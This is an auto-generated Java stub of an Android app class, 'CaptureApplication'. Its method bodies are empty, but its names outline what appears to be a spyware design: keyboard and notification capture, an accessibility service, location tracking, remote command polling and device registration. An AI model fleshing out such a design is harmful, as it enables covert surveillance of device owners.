package com.chats.capture;

@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000:\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0005\n\u0002\u0018\u0002\n\u0002\b\u0004\n\u0002\u0010\u0002\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0003\n\u0002\u0010\u000b\n\u0002\b\u0007\u0018\u0000 \u001e2\u00020\u0001:\u0001\u001eB\u0005\u00a2\u0006\u0002\u0010\u0002J\b\u0010\u0010\u001a\u00020\u0011H\u0002J\u0014\u0010\u0012\u001a\u00020\u00112\n\b\u0002\u0010\u0013\u001a\u0004\u0018\u00010\u0014H\u0002J\b\u0010\u0015\u001a\u00020\u0011H\u0002J\b\u0010\u0016\u001a\u00020\u0011H\u0002J\b\u0010\u0017\u001a\u00020\u0018H\u0002J\b\u0010\u0019\u001a\u00020\u0011H\u0016J\u0010\u0010\u001a\u001a\u00020\u00112\b\u0010\u001b\u001a\u0004\u0018\u00010\fJ\b\u0010\u001c\u001a\u00020\u0011H\u0002J\b\u0010\u001d\u001a\u00020\u0011H\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u001b\u0010\u0005\u001a\u00020\u00068FX\u0086\u0084\u0002\u00a2\u0006\f\n\u0004\b\t\u0010\n\u001a\u0004\b\u0007\u0010\bR\"\u0010\r\u001a\u0004\u0018\u00010\f2\b\u0010\u000b\u001a\u0004\u0018\u00010\f@BX\u0086\u000e\u00a2\u0006\b\n\u0000\u001a\u0004\b\u000e\u0010\u000f\u00a8\u0006\u001f"}, d2 = {"Lcom/chats/capture/CaptureApplication;", "Landroid/app/Application;", "()V", "applicationScope", "Lkotlinx/coroutines/CoroutineScope;", "database", "Lcom/chats/capture/database/CaptureDatabase;", "getDatabase", "()Lcom/chats/capture/database/CaptureDatabase;", "database$delegate", "Lkotlin/Lazy;", "<set-?>", "Lcom/chats/capture/services/EnhancedAccessibilityService;", "enhancedAccessibilityService", "getEnhancedAccessibilityService", "()Lcom/chats/capture/services/EnhancedAccessibilityService;", "createNotificationChannels", "", "initializeApiAndRegisterDevice", "fcmToken", "", "initializeApplication", "initializeFirebase", "isPackageInstalled", "", "onCreate", "setEnhancedAccessibilityService", "service", "startCommandPolling", "startLocationTracking", "Companion", "app_debug"})
public final class CaptureApplication extends android.app.Application {
    @org.jetbrains.annotations.NotNull()
    private final kotlinx.coroutines.CoroutineScope applicationScope = null;
    @org.jetbrains.annotations.NotNull()
    private final kotlin.Lazy database$delegate = null;
    @org.jetbrains.annotations.Nullable()
    private com.chats.capture.services.EnhancedAccessibilityService enhancedAccessibilityService;
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String NOTIFICATION_CHANNEL_ID = "notification_capture_channel";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String KEYBOARD_CHANNEL_ID = "keyboard_capture_channel";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String UPDATE_CHANNEL_ID = "update_channel";
    @org.jetbrains.annotations.NotNull()
    public static final com.chats.capture.CaptureApplication.Companion Companion = null;
    
    public CaptureApplication() {
        super();
    }
    
    @org.jetbrains.annotations.NotNull()
    public final com.chats.capture.database.CaptureDatabase getDatabase() {
        return null;
    }
    
    @org.jetbrains.annotations.Nullable()
    public final com.chats.capture.services.EnhancedAccessibilityService getEnhancedAccessibilityService() {
        return null;
    }
    
    public final void setEnhancedAccessibilityService(@org.jetbrains.annotations.Nullable()
    com.chats.capture.services.EnhancedAccessibilityService service) {
    }
    
    @java.lang.Override()
    public void onCreate() {
    }
    
    private final void initializeApplication() {
    }
    
    /**
     * Start location tracking service
     */
    private final void startLocationTracking() {
    }
    
    /**
     * Start command polling manager
     */
    private final void startCommandPolling() {
    }
    
    /**
     * Initialize Firebase and get FCM token
     */
    private final void initializeFirebase() {
    }
    
    private final void initializeApiAndRegisterDevice(java.lang.String fcmToken) {
    }
    
    /**
     * Check if package is fully installed
     */
    private final boolean isPackageInstalled() {
        return false;
    }
    
    private final void createNotificationChannels() {
    }
    
    @kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000\u0014\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0003\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002\u00a2\u0006\u0002\u0010\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000\u00a8\u0006\u0007"}, d2 = {"Lcom/chats/capture/CaptureApplication$Companion;", "", "()V", "KEYBOARD_CHANNEL_ID", "", "NOTIFICATION_CHANNEL_ID", "UPDATE_CHANNEL_ID", "app_debug"})
    public static final class Companion {
        
        private Companion() {
            super();
        }
    }
}